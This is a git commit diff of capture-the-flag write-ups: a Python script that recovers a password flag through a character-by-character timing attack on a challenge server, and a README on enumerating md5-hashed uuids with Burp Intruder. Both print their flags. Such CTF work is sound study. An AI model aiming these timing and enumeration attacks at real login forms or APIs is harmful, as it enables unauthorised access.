dc5662a7a1b7575df6a17efdbd852a88a9aba4e4
eshaan7 <ishubansal2000@gmail.com>
2019-06-19 22:35:19 +0530

    seasides some updates

--- HS_CTF_2019_WithWriteups/Networked_Password/breakit.py
+++ HS_CTF_2019_WithWriteups/Networked_Password/breakit.py
@@ -6,10 +6,7 @@ import string
 
 host = "https://networked-password.web.chal.hsctf.com/"
 
-charset = string.ascii_lowercase + string.digits + "{}_" # flag can container letters, digits, underscore, '{' and '}'
-r = requests.get(url=host)
-
-#print r.text
+charset = string.ascii_lowercase + string.digits + "}_" # flag can container letters, digits, underscore, '{' and '}'
 
 flag = "hsctf{"
 resp = 0
@@ -17,12 +14,17 @@ fc = ""
 
 while flag[-1]!= "}":
     for char in charset:
+        #char_list = []
+        #time_list = []
         payload = {"password" : flag + char}
         r = requests.post(url=host, data=payload)
         #print "current: ",flag+char," in ",r.elapsed.total_seconds()
         if r.elapsed.total_seconds() > resp:
             resp = r.elapsed.total_seconds()
             fc = char
+        #time_list.append(r.elapsed.total_seconds())
+        #char_list.append(char)
+    #fc = char_list[time_list.index(max(time_list))]
     flag += fc
     resp = 0
     print "current: ",flag
--- Seasides_CTF_2019/web/150_TheVice_COMPLETE/README.md
+++ Seasides_CTF_2019/web/150_TheVice_COMPLETE/README.md
@@ -1,8 +1,15 @@
-on visiting the given link, we get json data with 
-``` uuid=202cb962ac59075b964b07152d234b70 ```
-which is the md5 hash of '123' so 
-fire up burpsuite -> intruder -> bruteforce md5 of 1-100. 
-``` uuid=6c8349cc7260ae62e3b1396831a8398f ```
-i.e. md5 hash of '45', we get the flag! (check uuid_flag_ss.png)
+on visiting the given link, we get JSON data with 
 
-``` flag = SEA{intriguing_idawwr}SIDES ```
+	uuid=202cb962ac59075b964b07152d234b70
+
+which is the md5 hash of *'123'* 
+so 
+fire up `burpsuite -> intruder -> bruteforce md5 of 1-100.` 
+
+For,
+
+	uuid=6c8349cc7260ae62e3b1396831a8398f
+
+i.e. md5 hash of `45`, we get the flag! (check `uuid_flag_ss.png`)
+
+	flag = SEA{intriguing_idawwr}SIDES
